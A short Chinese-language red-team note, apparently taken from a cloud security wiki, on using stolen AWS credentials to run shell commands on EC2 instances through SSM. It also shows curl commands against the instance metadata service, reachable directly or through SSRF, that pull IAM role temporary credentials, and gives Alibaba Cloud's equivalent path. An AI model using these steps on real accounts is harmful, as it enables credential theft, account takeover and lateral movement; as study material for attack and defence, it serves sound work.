# aws-cli-command
利用 aws cli 执行命令
当目标实例被 AWS Systems Manager 代理后，除了在控制台可以执行命令外，拿到凭证后使用 AWS 命令行也可以在 EC2 上执行命令。

列出目标实例 ID

aws ec2 describe-instances --filters "Name=instance-type,Values=running" --query "Reservations[].Instances[].InstanceId"

aws ec2 describe-instances --query "Reservations[*].Instances[*].{ID:InstanceId,AZ:Placement.AvailabilityZone,Name:State.Name}" 


在对应的实例上执行命令，注意将 instance-ID 改成自己实例的 ID

aws ssm send-command \
    --instance-ids "instance-ID" \
    --document-name "AWS-RunShellScript" \
    --parameters commands=ifconfig \
    --output text
获得执行命令的结果，注意将 $sh-command-id 改成自己的 Command ID

aws ssm list-command-invocations \
    --command-id $sh-command-id \
    --details
  
  
元数据
元数据服务是一种提供查询运行中的实例内元数据的服务，当实例向元数据服务发起请求时，该请求不会通过网络传输，如果获得了目标 EC2 权限或者目标 EC2 存在 SSRF 漏洞，就可以获得到实例的元数据。

在云场景下可以通过元数据进行临时凭证和其他信息的收集，在 AWS 下的元数据地址为：http://169.254.169.254/latest/meta-data/，直接 curl 请求该地址即可。

通过元数据，攻击者除了可以获得 EC2 上的一些属性信息之外，有时还可以获得与该实例绑定角色的临时凭证，并通过该临时凭证获得云服务器的控制台权限，进而横向到其他机器。

通过访问元数据的 /iam/security-credentials/<rolename> 路径可以获得目标的临时凭证，进而接管目标服务器控制台账号权限，前提是目标需要配置 IAM 角色才行，不然访问会 404

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ -w '\n'
获取rolename
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<rolename> -w '\n'

通过元数据获得目标的临时凭证后，就可以接管目标账号权限了，这里介绍一些对于 RT 而言价值相对较高的元数据：

mac    实例 MAC 地址
hostname    实例主机名
iam/info    获取角色名称
local-ipv4    实例本地 IP
public-ipv4    实例公网 IP
instance-id    实例 ID
public-hostname    接口的公有 DNS (IPv4)
placement/region    实例的 AWS 区域
public-keys/0/openssh-key    公有密钥
/iam/security-credentials/<rolename>    获取角色的临时凭证
    
    
ali
    http://100.100.100.200/latest/meta-data
    http://100.100.100.200/latest/meta-data/ram/security-credentials/ 
  
  来源：https://wiki.teamssix.com/CloudService/EC2/ec2-exec-command.html
